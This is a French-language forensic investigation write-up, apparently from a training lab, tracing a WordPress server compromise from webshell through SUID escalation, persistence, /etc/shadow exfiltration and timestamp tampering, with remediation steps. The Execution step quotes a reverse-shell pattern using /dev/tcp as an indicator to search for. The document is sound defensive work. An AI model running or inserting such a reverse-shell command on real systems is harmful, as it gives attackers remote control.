# HIVE // DFIR — Compromission Serveur WordPress (Cas Blue Sun Corporation)

Cette fiche documente la méthodologie d'investigation forensique live (kill chain complète) menée suite à une alerte SOC P1 sur un serveur de production Ubuntu 24.04 (Apache + WordPress) : trafic sortant suspect vers une IP externe sur le port 4444. Accès fourni en lecture seule (`analyst`, sudo), contrainte stricte de non-altération du système durant l'investigation.

## 1. Contexte de l'alerte

- Détection SIEM : connexions sortantes répétées depuis le serveur de production WordPress vers une IP externe, port 4444, à partir de 02:00 UTC.
- Serveur isolé du réseau et préservé en l'état par le SOC avant investigation.
- Accès fourni : compte `analyst`, sudo en lecture seule pour investigation.
- Contrainte stricte : ne rien modifier, déplacer ou supprimer sur le système durant l'investigation.

## 2. Étape 1 — Accès initial

**Objectif :** identifier l'IP de l'attaquant, sa première activité, et le payload déposé.

Analyse des logs d'accès Apache pour repérer tout trafic externe atypique (IP inhabituelle, changement de User-Agent, requêtes sur des chemins non standards de l'arborescence WordPress).

```bash
sudo tail -n 100 /var/log/apache2/access.log
```

Confirmation du DocumentRoot pour localiser précisément les chemins WordPress :

```bash
cat /etc/apache2/sites-enabled/000-default.conf
```

**Indicateurs recherchés :**

- Requête sur `install.php` : signe d'une installation WordPress laissée en état incomplet, exploitable.
- Énumération du dossier `uploads/`.
- Requêtes POST répétées vers un fichier `.php` caché (préfixe `.`), avec bascule de User-Agent navigateur → outil automatisé (ex. `python-requests`) : signature d'un webshell.

## 3. Étape 2 — Exécution et élévation de privilèges

**Objectif :** reconstituer les commandes exécutées via le webshell, identifier la bascule vers un shell interactif, et la méthode d'escalade root.

Le webshell s'exécute sous le compte de service Apache (`www-data`). Les sessions bash interactives laissent une trace dans `.bash_history`, y compris pour les comptes de service.

```bash
sudo cat /var/www/.bash_history
```

Pour une lecture fiable incluant d'éventuels caractères de contrôle utilisés en anti-forensics :

```bash
sudo cat -A /var/www/.bash_history
```

**Schéma de progression typique à rechercher :**

1. Reconnaissance (`id`, `cat /etc/passwd`, `uname -a`)
2. Bascule webshell → shell interactif (reverse shell, ex. pattern `bash -i >& /dev/tcp/<IP>/<port> 0>&1`)
3. Énumération de binaires SUID pour l'escalade :

```bash
find / -perm -4000 -type f 2>/dev/null
```

4. Exécution du binaire SUID vulnérable identifié
5. Création d'un compte de persistance avec privilèges sudo étendus

Vérification des permissions du binaire suspecté :

```bash
sudo ls -la /usr/local/bin/<binaire_suspect>
```

## 4. Étape 3 — Persistance et exfiltration

**Objectif :** cartographier tous les mécanismes de persistance et confirmer l'exfiltration de données.

Historique complet du compte de persistance créé à l'étape précédente :

```bash
sudo cat /home/<compte_persistance>/.bash_history
```

**Mécanismes de persistance à vérifier systématiquement :**

Clés SSH ajoutées (accès direct, indépendant du mot de passe) :

```bash
sudo cat /home/<compte_persistance>/.ssh/authorized_keys
```

Tâches cron du compte compromis :

```bash
sudo crontab -l -u <compte_persistance>
```

Services systemd créés ou modifiés récemment :

```bash
sudo find /etc/systemd/system -newer /var/www/html/wp-config.php -type f
```

Contenu de tout script suspect trouvé dans un répertoire de staging (`/tmp`, `/var/tmp`, sous-répertoires cachés) :

```bash
sudo cat /var/tmp/.cache/<script_suspect>.sh
```

Contenu du service systemd suspect identifié :

```bash
sudo cat /etc/systemd/system/<service_suspect>.service
```

Inventaire complet du répertoire de staging :

```bash
sudo ls -la /var/tmp/.cache/
```

Confirmation de la date de première connexion SSH du compte de persistance et de l'IP source :

```bash
sudo grep <compte_persistance> /var/log/auth.log*
```

Recherche d'outils supplémentaires potentiellement déposés puis supprimés par l'attaquant :

```bash
sudo find / -iname "<nom_outil>*" -newer /var/www/html/wp-config.php 2>/dev/null
```

## 5. Étape 4 — Anti-forensics

**Objectif :** identifier les manipulations de timestamps et les tentatives d'effacement de traces.

Rappel technique : un attaquant peut réécrire `atime`/`mtime` via `touch`, mais pas `ctime` (horodatage de changement des métadonnées inode), qui reflète toujours le moment réel de l'opération de manipulation. Le champ `Birth` (quand disponible, ext4/statx) est également fiable.

Vérification des trois/quatre timestamps sur chaque fichier suspect identifié :

```bash
sudo stat /var/www/html/wp-content/uploads/<webshell>
sudo stat /var/tmp/.cache/<script_suspect>.sh
sudo stat /usr/local/bin/<binaire_suspect>
```

**Signal d'antidatation :** `atime`/`mtime` affichant une date antérieure incohérente avec la timeline de l'attaque, alors que `ctime`/`Birth` sont proches ou identiques entre plusieurs fichiers — signe d'une opération de nettoyage groupée en une seule session.

Recherche de webshells additionnels non détectés — privilégier une revue directe du contenu du dossier uploads plutôt qu'un filtre sur timestamp (peu fiable si l'attaquant maîtrise l'antidatation) :

```bash
sudo find /var/www/html/wp-content/uploads -name "*.php"
```

## 6. Approfondissements complémentaires

Vérification d'un usage éventuel des comptes administrateurs légitimes après exfiltration des hashs :

```bash
sudo grep -E "<compte_admin_1>|<compte_admin_2>" /var/log/auth.log*
```

Vérification des tâches cron du compte root :

```bash
sudo crontab -l -u root
```

## 7. Chaîne d'attaque — résumé

1. **Accès initial (T1190)** — Exploitation d'une installation WordPress incomplète via `install.php`, dépôt d'un webshell caché dans `wp-content/uploads/`.
2. **Exécution (T1505.003, T1059.004)** — Commandes via webshell, puis bascule vers un reverse shell interactif.
3. **Reconnaissance et élévation (T1082, T1548.001/.003)** — Énumération SUID, exploitation d'un binaire SUID root non standard.
4. **Persistance (T1136.001, T1098.004, T1053.003, T1543.002)** — Création de compte avec sudo NOPASSWD, clé SSH, cron, service systemd auto-reconnectant.
5. **Exfiltration (T1003.008, T1005, T1041)** — Copie et envoi de `/etc/shadow` vers l'infrastructure C2 via HTTP POST, automatisé par cron.
6. **Anti-forensics (T1070.006)** — Retour ultérieur de l'attaquant, antidatation groupée de plusieurs fichiers pour brouiller la timeline réelle.

**Constat clé :** deux infrastructures distinctes utilisées par l'attaquant — une IP pour l'accès direct (webshell + SSH), une seconde comme serveur C2 dédié (reverse shell + réception de l'exfiltration). Point à systématiquement vérifier dans ce type d'investigation : ne pas supposer une infrastructure unique.

## 8. Checklist de remédiation (template réutilisable)

### Immédiat (avant toute reconnexion réseau)

- Maintenir l'isolation réseau du serveur jusqu'à assainissement complet.
- Désactiver et supprimer tout service systemd de persistance identifié.
- Supprimer les tâches cron malveillantes.
- Verrouiller/supprimer les comptes créés par l'attaquant et toute règle sudoers associée.
- Purger les clés SSH illégitimes des `authorized_keys` concernés.
- Supprimer le(s) webshell(s) et tout binaire SUID planté.
- Supprimer les répertoires de staging et scripts d'exfiltration.
- Bloquer en entrée/sortie toute IP identifiée comme infrastructure attaquante.

### Court terme (24–48h)

- Réinitialiser tous les mots de passe locaux si `/etc/shadow` a été exfiltré.
- Faire tourner les clés SSH de tous les comptes admin légitimes.
- Réinstaller l'application web (core, thèmes, plugins) depuis des sources officielles ; comparaison de hashs.
- Revue complète des logs sur toute la période disponible, au-delà de la seule fenêtre déjà identifiée.
- Audit système des binaires SUID pour détecter d'autres backdoors du même type.
- Mise à jour de l'application web et fermeture du point d'entrée initial (ex. restriction d'accès à `install.php`).

### Long terme (améliorations systémiques)

- Interdire l'exécution de scripts dans les répertoires d'upload (configuration serveur web).
- Déployer une surveillance d'intégrité de fichiers (FIM) sur les chemins sensibles (webroot, systemd, cron, sudoers).
- Réviser la politique sudo : suppression des règles `NOPASSWD: ALL` génériques, moindre privilège par compte de service.
- Alerting SIEM sur création de compte, modification sudoers, nouveau service systemd.
- Centralisation des logs en écriture seule pour contrer l'anti-forensics local (`history -c`, antidatation).
- Segmentation réseau : allowlist des flux sortants depuis les serveurs de production.

## 9. Enseignements méthodologiques

- Ne jamais se fier uniquement à `mtime`/`atime` pour dater une compromission : toujours croiser avec `ctime`, et `Birth` quand disponible.
- Un `find -newer` filtre en interne sur `mtime` même si l'affichage est forcé sur `ctime` via `-printf` : pour une détection fiable de fichiers récents malgré antidatation, une revue directe du contenu d'un répertoire sensible reste plus sûre qu'un filtre par timestamp.
- Toujours vérifier si plusieurs infrastructures IP distinctes sont utilisées par l'attaquant (canal de contrôle direct vs C2 automatisé) — ne pas supposer une seule IP source pour tout l'incident.
- Un compte de persistance avec sudo NOPASSWD doit toujours être audité pour tout usage de `sudo`, pas seulement les commandes de reconnaissance initiales.
- Confirmer l'absence d'artefact (fichier "disparu") ne clôt pas le point : documenter l'hypothèse (suppression par l'attaquant vs échec de dépôt) sans trancher sans preuve.
